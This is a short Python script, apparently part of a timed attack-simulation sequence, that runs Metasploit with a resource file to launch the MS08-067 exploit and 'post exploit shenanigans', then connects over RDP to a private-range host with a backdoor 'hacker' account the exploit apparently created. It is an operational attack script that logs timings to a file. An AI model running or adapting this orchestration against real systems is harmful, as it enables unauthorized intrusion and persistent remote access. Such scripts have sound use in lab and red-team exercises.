#!/usr/bin/python

import os
import time
import sys
import datetime
from datetime import timedelta

##### Attack #9: MS08_067 #####
##### Total operational time: 5 minutes

starttime=time.time()
counter=60	# 60 = 1 minute
atktime  = time.time()+(counter*5)

def printtime(atkdef):
	elapsed = str(timedelta(seconds=(time.time()-starttime))).split('.',2)[0]
	clocktime = str(time.strftime("%H:%M:%S"))
	os.system('echo "'+atkdef+': '+elapsed+' ['+clocktime+']" >> timer.txt')

printtime("    MS08_067 start")

#execute MS08_067 exploit & post exploit shenanigans 
#gp.rc contains 2 min. of total delays

printtime("    - gp.rc start")
os.system("msfconsole -r /usr/share/metasploit-framework/scripts/gp.rc")

printtime("    - gp.rc complete. 60 second delay")
#delay execution for 1 minutes
time.sleep(60)

printtime("    - RDP")
#connect to remote desktop enabled by exploit
os.system("rdesktop -u hacker -p password 192.168.1.12")

timeleft = atktime-time.time()
if timeleft>0:
	printtime("    - sleep for time remaining")
	time.sleep(timeleft)

printtime("    MS08_067 finish")

